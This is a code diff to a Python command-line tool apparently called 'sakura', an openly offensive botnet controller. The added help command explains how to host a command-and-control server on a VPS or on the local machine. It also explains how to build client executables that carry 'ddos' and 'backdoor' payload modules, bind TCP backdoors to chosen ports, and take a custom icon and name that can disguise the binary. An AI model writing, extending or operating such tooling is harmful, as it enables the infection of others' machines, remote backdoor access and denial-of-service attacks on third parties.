@@ -63,10 +63,47 @@ def _(event):
 ### -=-=-=- CORE -=-=-=- ###
 
 def eval_command(f: tuple[str, list[str]]):
+    args = f[1]
     match f[0]:
         case "help":
+            if len(args) > 0:
+                match args[0]:
+                    case "setup":
+                        print(f"""{colorama.Fore.GREEN}||| How to setup sakura:{colorama.Style.RESET_ALL}
+{colorama.Fore.LIGHTRED_EX}|| Setup server{colorama.Style.RESET_ALL}
+{colorama.Fore.YELLOW}| Use your VPS{colorama.Style.RESET_ALL}
+   {colorama.Fore.LIGHTCYAN_EX}If you have VPS server, you can use them as host.{colorama.Style.RESET_ALL}
+     1. Build executable: run 'build server'.
+     2. Load executable to your server.
+     3. Run, setup username and password.
+     | Done! Connect to server via 'connect <host>'
+{colorama.Fore.YELLOW}| Use this machine{colorama.Style.RESET_ALL}
+   {colorama.Fore.RED}[WARNING]{colorama.Fore.LIGHTCYAN_EX} Use this only if you have 'white' (public) ip!{colorama.Style.RESET_ALL}
+    1. Setup server: run 'build self-host'
+    | Done! Now you're hosting server for your botnet!
+
+{colorama.Fore.LIGHTRED_EX}|| Build executable for clients{colorama.Style.RESET_ALL}
+{colorama.Fore.YELLOW}| Setting up executable{colorama.Style.RESET_ALL}
+   {colorama.Fore.LIGHTCYAN_EX}Apply options via 'build opts <option>'
+   Check applied options - 'build opts'
+   Clear options list - 'build opts clear'{colorama.Style.RESET_ALL}
+    - TAG      > tag - identifier for this executable.
+    - PAYLOAD  > payload - modules to load. Select all by typing 'all'. Example: 'ddos,backdoor'
+    - BACKDOOR > backdoor - use only if you have module 'backdoor'. Value - ports to bind tcp backdoor. Example: '65532,65531.65530,8282'
+{colorama.Fore.YELLOW}| Building executable{colorama.Style.RESET_ALL}
+   {colorama.Fore.LIGHTCYAN_EX}Build via 'build client <type>'. Here's list of all types:{colorama.Style.RESET_ALL}
+    - SOURCE   > Client source code on python. Ready for building on platforms, other than {sys.platform}.
+    - DEFAULT  > Default build on pyinstaller for {sys.platform}. Icon will not be changed
+    - CUSTOM   > Customisable build (based on pyinstaller). Change icon, name. Use these tags: ICON; NAME;""")
+                        return
+                    case _:
+                        for command in COMMANDS:
+                            if command == args[0]:
+                                print(COMMANDS[command][1])
+                                return
             for command in COMMANDS:
                 print(f"{command} {(8-len(command))*' '} | {COMMANDS[command][0]}")
+            print(f"\n{colorama.Style.BRIGHT}If you didn't know, how to setup sakura, please run 'help setup'{colorama.Style.RESET_ALL}")
         case "kill":
             print(".. under construction ..")
         case "ddos":
